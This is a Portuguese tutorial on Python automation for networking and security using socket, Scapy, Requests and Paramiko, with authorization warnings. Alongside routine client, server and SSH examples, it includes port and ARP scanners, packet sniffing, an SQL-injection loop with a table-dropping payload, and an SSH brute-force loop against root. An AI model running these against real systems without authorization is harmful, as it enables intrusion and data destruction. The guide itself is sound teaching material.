# Automação com Python para Redes e Segurança — Guia do Básico ao Avançado

> ⚠️ Use estas técnicas apenas em ambientes próprios ou com autorização explícita — os mesmos princípios do arquivo de Segurança Ofensiva e Defensiva se aplicam aqui.

Este guia cobre 4 bibliotecas centrais para automação de rede e segurança em Python: **sockets** (comunicação de rede de baixo nível), **Scapy** (manipulação de pacotes), **Requests** (HTTP) e **Paramiko** (SSH).

---

## 1. `socket` — comunicação de rede de baixo nível

A biblioteca `socket` é nativa do Python e permite criar conexões de rede diretamente, na base do TCP/UDP — é o que outras bibliotecas de rede usam por baixo dos panos.

### Conceitos-chave
| Termo | Significado |
|---|---|
| **Socket** | Ponto de comunicação entre dois hosts (IP + porta) |
| `AF_INET` | Família de endereço IPv4 |
| `SOCK_STREAM` | Socket TCP (confiável, orientado à conexão) |
| `SOCK_DGRAM` | Socket UDP (rápido, sem conexão) |

### Cliente TCP simples
```python
import socket

cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
cliente.connect(("exemplo.com", 80))

requisicao = b"GET / HTTP/1.1\r\nHost: exemplo.com\r\n\r\n"
cliente.send(requisicao)

resposta = cliente.recv(4096)
print(resposta.decode())

cliente.close()
```

### Servidor TCP simples
```python
import socket

servidor = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
servidor.bind(("0.0.0.0", 9999))
servidor.listen(5)
print("Aguardando conexões...")

while True:
    conexao, endereco = servidor.accept()
    print(f"Conectado por {endereco}")
    dados = conexao.recv(1024)
    print("Recebido:", dados.decode())
    conexao.send(b"Mensagem recebida!")
    conexao.close()
```

### Port Scanner simples com sockets
```python
import socket

alvo = "192.168.1.10"
portas = [21, 22, 23, 25, 80, 443, 3306]

for porta in portas:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)
    resultado = s.connect_ex((alvo, porta))   # retorna 0 se a porta está aberta
    if resultado == 0:
        print(f"Porta {porta}: ABERTA")
    s.close()
```

### Cliente/Servidor UDP
```python
# Cliente UDP
cliente = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
cliente.sendto(b"Ola", ("127.0.0.1", 9999))

# Servidor UDP
servidor = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
servidor.bind(("0.0.0.0", 9999))
dados, endereco = servidor.recvfrom(1024)
print(dados.decode(), endereco)
```

---

## 2. `Scapy` — criação e manipulação de pacotes

O **Scapy** permite construir, enviar, capturar e analisar pacotes de rede em praticamente qualquer camada — muito usado em pentest, análise de tráfego e prototipagem de ataques/defesas.

Instalação:
```bash
pip install scapy
```
No Linux, operações de rede geralmente exigem `sudo`.

### Conceitos-chave
| Termo | Significado |
|---|---|
| `IP()` | Camada 3 (endereçamento IP) |
| `TCP()` / `UDP()` | Camada 4 (transporte) |
| `ICMP()` | Usado no ping |
| `Ether()` | Camada 2 (Ethernet/MAC) |
| `sr()` / `sr1()` | Envia e recebe pacotes (retorna resposta) |
| `send()` / `sendp()` | Envia sem esperar resposta (`sendp` inclui camada 2) |
| `sniff()` | Captura pacotes da rede |

### Criando e enviando um pacote ICMP (ping manual)
```python
from scapy.all import IP, ICMP, sr1

pacote = IP(dst="8.8.8.8") / ICMP()
resposta = sr1(pacote, timeout=2)

if resposta:
    resposta.show()
else:
    print("Sem resposta")
```

### Scan de portas TCP (SYN scan) com Scapy
```python
from scapy.all import IP, TCP, sr1

alvo = "192.168.1.10"
portas = [22, 80, 443]

for porta in portas:
    pacote = IP(dst=alvo) / TCP(dport=porta, flags="S")
    resposta = sr1(pacote, timeout=1, verbose=0)
    if resposta and resposta.haslayer(TCP):
        if resposta[TCP].flags == 0x12:  # SYN-ACK = porta aberta
            print(f"Porta {porta}: ABERTA")
```

### Capturando pacotes (sniffing)
```python
from scapy.all import sniff

def processar_pacote(pacote):
    print(pacote.summary())

sniff(iface="eth0", prn=processar_pacote, count=10)
```

### Filtrando com BPF (Berkeley Packet Filter)
```python
sniff(filter="tcp port 80", prn=processar_pacote, count=20)
```

### ARP scan (descobrir hosts vivos na rede local)
```python
from scapy.all import ARP, Ether, srp

alvo = "192.168.1.0/24"
pacote = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=alvo)
respostas = srp(pacote, timeout=2, verbose=0)[0]

for enviado, recebido in respostas:
    print(f"{recebido.psrc} -> {recebido.hwsrc}")
```

---

## 3. `Requests` — automação HTTP

A biblioteca `requests` simplifica chamadas HTTP — essencial para automatizar testes em APIs, aplicações web e reconhecimento.

Instalação:
```bash
pip install requests
```

### Requisições básicas
```python
import requests

resposta = requests.get("https://api.exemplo.com/dados")
print(resposta.status_code)
print(resposta.json())       # se a resposta for JSON
print(resposta.text)         # se for texto puro
```

### Enviando dados (POST)
```python
dados = {"usuario": "admin", "senha": "1234"}
resposta = requests.post("https://exemplo.com/login", data=dados)
print(resposta.status_code, resposta.text)

# Enviando JSON
resposta = requests.post("https://api.exemplo.com/dados", json=dados)
```

### Headers, parâmetros e sessões
```python
headers = {"User-Agent": "MeuScript/1.0", "Authorization": "Bearer TOKEN"}
parametros = {"busca": "python", "pagina": 2}

resposta = requests.get("https://exemplo.com/api", headers=headers, params=parametros)

# Sessão mantém cookies entre requisições (útil para manter login)
sessao = requests.Session()
sessao.post("https://exemplo.com/login", data=dados)
resposta = sessao.get("https://exemplo.com/painel")
```

### Timeout, erros e verificação SSL
```python
try:
    resposta = requests.get("https://exemplo.com", timeout=5, verify=True)
    resposta.raise_for_status()   # lança erro se status >= 400
except requests.exceptions.Timeout:
    print("Tempo esgotado")
except requests.exceptions.HTTPError as erro:
    print(f"Erro HTTP: {erro}")
```

### Exemplo prático: verificando status de vários subdomínios
```python
subdominios = ["www.exemplo.com", "api.exemplo.com", "blog.exemplo.com"]

for sub in subdominios:
    try:
        r = requests.get(f"https://{sub}", timeout=3)
        print(f"{sub}: {r.status_code}")
    except requests.exceptions.RequestException:
        print(f"{sub}: sem resposta")
```

### Testando SQL Injection básico (em ambiente autorizado)
```python
payloads = ["' OR '1'='1", "'; DROP TABLE usuarios; --"]

for payload in payloads:
    r = requests.get("http://alvo-de-teste.local/login", params={"usuario": payload})
    if "bem-vindo" in r.text.lower():
        print(f"Possível vulnerabilidade com payload: {payload}")
```

---

## 4. `Paramiko` — automação SSH

O **Paramiko** permite conectar, executar comandos e transferir arquivos via SSH direto do Python — ótimo para administração remota e automação de múltiplos servidores.

Instalação:
```bash
pip install paramiko
```

### Conexão e execução de comando remoto
```python
import paramiko

cliente = paramiko.SSHClient()
cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
cliente.connect("192.168.1.20", username="usuario", password="senha")

stdin, stdout, stderr = cliente.exec_command("uptime")
print(stdout.read().decode())

cliente.close()
```

### Autenticação com chave privada
```python
chave = paramiko.RSAKey.from_private_key_file("/caminho/chave.pem")
cliente.connect("192.168.1.20", username="usuario", pkey=chave)
```

### Transferência de arquivos com SFTP
```python
sftp = cliente.open_sftp()
sftp.put("arquivo_local.txt", "/home/usuario/arquivo_remoto.txt")   # envia
sftp.get("/home/usuario/log.txt", "log_baixado.txt")                # baixa
sftp.close()
```

### Executando comandos em vários servidores (automação em massa)
```python
servidores = ["192.168.1.20", "192.168.1.21", "192.168.1.22"]

for host in servidores:
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cliente.connect(host, username="usuario", password="senha", timeout=5)
        stdin, stdout, stderr = cliente.exec_command("df -h")
        print(f"--- {host} ---")
        print(stdout.read().decode())
    except Exception as erro:
        print(f"Falha em {host}: {erro}")
    finally:
        cliente.close()
```

### Brute force SSH básico (SOMENTE em laboratório próprio)
```python
import paramiko

def testar_senha(host, usuario, senha):
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        cliente.connect(host, username=usuario, password=senha, timeout=3)
        cliente.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False

senhas = ["123456", "senha", "admin", "root"]
for senha in senhas:
    if testar_senha("192.168.1.20", "root", senha):
        print(f"Senha encontrada: {senha}")
        break
```

---

## 5. Combinando as bibliotecas

Um pequeno **scanner de rede** combinando conceitos:

```python
import socket
from scapy.all import ARP, Ether, srp
import requests

def descobrir_hosts(rede):
    pacote = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=rede)
    respostas = srp(pacote, timeout=2, verbose=0)[0]
    return [recebido.psrc for _, recebido in respostas]

def scan_portas(host, portas):
    abertas = []
    for porta in portas:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((host, porta)) == 0:
            abertas.append(porta)
        s.close()
    return abertas

def verificar_http(host):
    try:
        r = requests.get(f"http://{host}", timeout=2)
        return r.status_code
    except requests.exceptions.RequestException:
        return None

hosts = descobrir_hosts("192.168.1.0/24")
for host in hosts:
    portas = scan_portas(host, [22, 80, 443])
    status_http = verificar_http(host) if 80 in portas else None
    print(f"{host} — portas abertas: {portas} — HTTP: {status_http}")
```

---

## 6. Boas práticas

- Sempre validar timeout em conexões de rede, para scripts não travarem esperando resposta
- Tratar exceções específicas (`try/except`) em vez de capturar tudo genericamente
- Usar `venv` para isolar dependências de cada projeto
- Nunca deixar credenciais (senhas, tokens, chaves) hardcoded no código — usar variáveis de ambiente
- Documentar e restringir o escopo de scripts ofensivos ao ambiente autorizado

---

## 7. Próximos passos sugeridos

- Praticar criando um port scanner completo com `socket` e comparar com um feito em `Scapy`
- Automatizar coleta de informações de múltiplos servidores via `Paramiko`
- Combinar `Requests` com `BeautifulSoup` para automação de reconhecimento web
- Seguir para o arquivo de **Kali Linux**, onde essas técnicas se conectam com as ferramentas prontas da distro
